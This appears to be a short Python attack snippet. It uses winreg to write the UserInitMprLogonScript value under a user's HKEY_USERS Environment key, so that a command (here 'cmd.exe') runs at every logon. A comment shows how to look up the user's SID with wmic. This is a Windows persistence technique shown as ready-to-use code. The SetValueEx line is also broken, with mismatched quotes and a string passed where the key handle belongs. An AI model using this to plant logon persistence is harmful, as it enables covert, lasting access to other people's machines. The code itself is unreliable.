import winreg

reghive = winreg.HKEY_USERS
userSID = "<userSID>"
regpath = userSID+"\Environment"

command = "cmd.exe"

key = winreg.OpenKey(reghive,regpath,0,access=winreg.KEY_WRITE)
winreg.SetValueEx("key,"UserInitMprLogonScript",0,winreg.REG_SZ,command)

#get the userSID with: 
#wmic useraccount where name = <USERNAME> get sid


